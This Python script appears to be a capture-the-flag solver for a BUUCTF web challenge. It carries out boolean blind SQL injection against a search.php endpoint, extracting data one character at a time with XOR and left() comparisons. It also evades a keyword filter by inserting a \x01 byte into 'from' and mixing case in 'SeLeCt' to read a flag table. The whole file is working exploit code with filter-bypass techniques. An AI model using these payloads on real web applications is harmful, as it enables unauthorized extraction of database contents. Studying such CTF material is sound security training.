#!/usr/bin/env python3
import requests
import time
import string

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(ERROR), False = 条件为假(Clever)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text or "Error" in r.text
    except:
        return False

def blind_extract_left(query, name="", max_len=50):
    """使用 left 函数盲注提取数据"""
    result = ""
    charset = string.ascii_lowercase + string.digits + "_-{}" + string.ascii_uppercase + "!@#$%^&*()+=[]|;:',.<>?/~`"
    
    for pos in range(1, max_len + 1):
        found = False
        for c in charset:
            payload = f'6^(left(({query}),{pos})="{result}{c}")'
            if check(payload):
                result += c
                print(f"    {name}: {result}")
                found = True
                break
        if not found:
            # 尝试其他字符
            for c in string.printable:
                if c in '\'"\\': continue
                payload = f'6^(left(({query}),{pos})="{result}{c}")'
                if check(payload):
                    result += c
                    print(f"    {name}: {result}")
                    found = True
                    break
            if not found:
                print(f"    {name}: {result} (end)")
                break
    return result

# 使用 \x01 绕过 from 过滤
# 使用 max 获取单行数据
print("[*] Getting flag from fl4g table...")
flag_query = "max(SeLeCt(flag)fr\x01omfl4g)"
flag = blind_extract_left(flag_query, "Flag")
print(f"\n[+] FLAG: {flag}")

